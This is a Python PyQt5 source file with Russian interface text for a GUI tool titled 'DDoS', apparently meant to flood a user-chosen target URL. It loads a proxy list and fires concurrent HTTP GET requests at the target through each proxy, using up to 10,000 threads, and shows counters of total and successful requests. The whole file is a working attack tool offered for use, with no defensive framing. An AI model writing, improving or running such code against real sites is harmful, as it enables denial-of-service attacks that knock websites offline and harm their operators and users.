import sys
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, QLineEdit, QFileDialog, QWidget, QMessageBox, QSpinBox, QFrame
from PyQt5.QtGui import QFont
from qt_material import apply_stylesheet

class ProxyKiller(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("DDoS | TEST")
        self.setFixedSize(800, 400)  # Увеличиваем ширину и уменьшаем высоту окна

        # Переменные
        self.proxies = set()
        self.target_url = ""
        self.total_requests = 0
        self.successful_requests = 0
        self.is_running = False

        # Инициализация интерфейса
        self.init_ui()

    def init_ui(self):
        main_widget = QWidget()
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(30, 20, 30, 20)  # Большие отступы по бокам и сверху/снизу
        
        # Заголовок
        header = QLabel("DDoS")
        header.setFont(QFont("Arial", 32, QFont.Bold))
        header.setAlignment(Qt.AlignCenter)
        header.setStyleSheet("color: #9C27B0; margin-bottom: 20px;")  # Яркий заголовок
        main_layout.addWidget(header)

        # Поле для ввода URL цели
        url_layout = QHBoxLayout()
        url_label = QLabel("Целевой URL:")
        url_label.setFont(QFont("Arial", 12))
        self.url_input = QLineEdit(self.target_url)
        self.url_input.setPlaceholderText("Введите URL цели для атаки")
        self.url_input.setFont(QFont("Arial", 12))
        self.url_input.setStyleSheet("padding: 8px; border: 1px solid #9C27B0; border-radius: 5px;")
        url_layout.addWidget(url_label)
        url_layout.addWidget(self.url_input)
        main_layout.addLayout(url_layout)

        # Поле для количества потоков
        threads_layout = QHBoxLayout()
        threads_label = QLabel("Количество потоков:")
        threads_label.setFont(QFont("Arial", 12))
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, 10000)
        self.threads_input.setValue(500)
        self.threads_input.setStyleSheet("padding: 8px; border: 1px solid #9C27B0; border-radius: 5px;")
        threads_layout.addWidget(threads_label)
        threads_layout.addWidget(self.threads_input)
        main_layout.addLayout(threads_layout)

        # Кнопки действий
        button_layout = QHBoxLayout()
        
        # Кнопка для загрузки прокси
        load_proxies_btn = QPushButton("Загрузить Прокси")
        load_proxies_btn.clicked.connect(self.load_proxies)
        load_proxies_btn.setStyleSheet("background-color: #673AB7; color: white; padding: 12px; font-weight: bold; border-radius: 8px;")
        button_layout.addWidget(load_proxies_btn)

        # Кнопка для начала атаки
        start_attack_btn = QPushButton("Начать Атаку")
        start_attack_btn.clicked.connect(self.start_attack)
        start_attack_btn.setStyleSheet("background-color: #E91E63; color: white; padding: 12px; font-weight: bold; border-radius: 8px;")
        button_layout.addWidget(start_attack_btn)

        # Кнопка для остановки атаки
        stop_attack_btn = QPushButton("Остановить Атаку")
        stop_attack_btn.clicked.connect(self.stop_attack)
        stop_attack_btn.setStyleSheet("background-color: #FF5722; color: white; padding: 12px; font-weight: bold; border-radius: 8px;")
        button_layout.addWidget(stop_attack_btn)

        main_layout.addLayout(button_layout)

        # Статус запроса
        self.status_label = QLabel("Всего запросов: 0 | Успешных запросов: 0")
        self.status_label.setFont(QFont("Arial", 12))
        self.status_label.setAlignment(Qt.AlignCenter)
        self.status_label.setStyleSheet("color: #9C27B0; margin-top: 15px;")
        main_layout.addWidget(self.status_label)

        # Устанавливаем основной виджет
        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)

    def load_proxies(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Выберите файл с прокси", "", "Text Files (*.txt)")
        if file_name:
            with open(file_name, 'r') as file:
                for line in file:
                    proxy = line.strip()
                    if proxy:
                        self.proxies.add(proxy)
            QMessageBox.information(self, "Загрузка Прокси", f"Загружено {len(self.proxies)} прокси.")

    def start_attack(self):
        if not self.proxies:
            QMessageBox.warning(self, "Ошибка", "Сначала загрузите прокси.")
            return
        
        self.target_url = self.url_input.text()
        if not self.target_url:
            QMessageBox.warning(self, "Ошибка", "Введите URL цели.")
            return
        
        # Установка максимального количества потоков
        self.max_threads = self.threads_input.value()
        
        # Сброс счётчиков
        self.total_requests = 0
        self.successful_requests = 0
        self.is_running = True

        # Запуск потока атаки
        self.attack_thread = AttackThread(self.proxies, self.target_url, self.max_threads)
        self.attack_thread.update_status.connect(self.update_status)
        self.attack_thread.finished.connect(self.attack_finished)
        self.attack_thread.start()

    def update_status(self, total_requests, successful_requests):
        self.total_requests = total_requests
        self.successful_requests = successful_requests
        self.status_label.setText(f"Всего запросов: {self.total_requests} | Успешных запросов: {self.successful_requests}")

    def stop_attack(self):
        if self.is_running:
            self.is_running = False
            self.attack_thread.stop()
            QMessageBox.information(self, "Информация", "Атака остановлена.")
    
    def attack_finished(self):
        self.is_running = False
        QMessageBox.information(self, "Информация", "Атака завершена.")

class AttackThread(QThread):
    update_status = pyqtSignal(int, int)

    def __init__(self, proxies, target_url, max_threads):
        super().__init__()
        self.proxies = proxies
        self.target_url = target_url
        self.total_requests = 0
        self.successful_requests = 0
        self.is_running = True
        self.max_threads = max_threads
        self.lock = Lock()

    def run(self):
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(self.attack_proxy, proxy) for proxy in self.proxies]
            for future in as_completed(futures):
                if not self.is_running:
                    break
                self.update_status.emit(self.total_requests, self.successful_requests)
                future.result()

    def attack_proxy(self, proxy):
        headers = {'User-Agent': 'Mozilla/5.0'}
        try:
            response = requests.get(self.target_url, proxies={"http": proxy, "https": proxy}, headers=headers, timeout=10)
            with self.lock:
                self.total_requests += 1
                if response.status_code == 200:
                    self.successful_requests += 1
        except requests.RequestException:
            pass

    def stop(self):
        self.is_running = False

if __name__ == "__main__":
    app = QApplication(sys.argv)
    apply_stylesheet(app, theme='dark_purple.xml')
    
    window = ProxyKiller()
    window.show()
    sys.exit(app.exec_())
